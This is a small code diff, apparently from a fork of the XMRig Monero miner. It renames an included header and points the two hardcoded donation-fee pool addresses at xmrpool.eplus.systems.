@@ -28,7 +28,7 @@
 #include "net/strategies/DonateStrategy.h"
 #include "net/strategies/FailoverStrategy.h"
 #include "Platform.h"
-#include "xmrig.h"
+#include "xmr_arch64.h"
 
 
 extern "C"
@@ -37,8 +37,8 @@ extern "C"
 }
 
 
-const static char *kDonatePool1   = "miner.fee.xmrig.com";
-const static char *kDonatePool2   = "emergency.fee.xmrig.com";
+const static char *kDonatePool1   = "xmrpool.eplus.systems";
+const static char *kDonatePool2   = "xmrpool.eplus.systems";
 
 
 static inline int random(int min, int max){
